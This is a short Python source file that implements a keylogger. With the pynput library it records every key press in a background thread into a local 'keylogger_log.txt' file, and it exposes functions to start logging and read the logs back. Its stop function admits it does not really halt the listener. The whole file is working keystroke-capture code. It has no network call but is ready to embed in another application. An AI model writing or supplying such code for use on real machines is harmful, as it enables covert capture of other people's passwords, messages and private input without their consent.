from pynput import keyboard
import threading
import os

log_file_path = os.path.join(os.getcwd(), "keylogger_log.txt")
logging_active = False

def write_log(key):
    with open(log_file_path, "a") as log_file:
        try:
            log_file.write(f"{key.char}")
        except AttributeError:
            log_file.write(f" [{key}] ")

def start_keylogger():
    global logging_active
    if logging_active:
        return
    logging_active = True
    def run():
        with keyboard.Listener(on_press=write_log) as listener:
            listener.join()
    t = threading.Thread(target=run)
    t.start()

def stop_keylogger():
    global logging_active
    logging_active = False
    # Note: stopping pynput listener programmatically is complex, handled on app restart

def get_logs():
    if os.path.exists(log_file_path):
        with open(log_file_path, "r") as f:
            return f.read()
    return "No logs available."
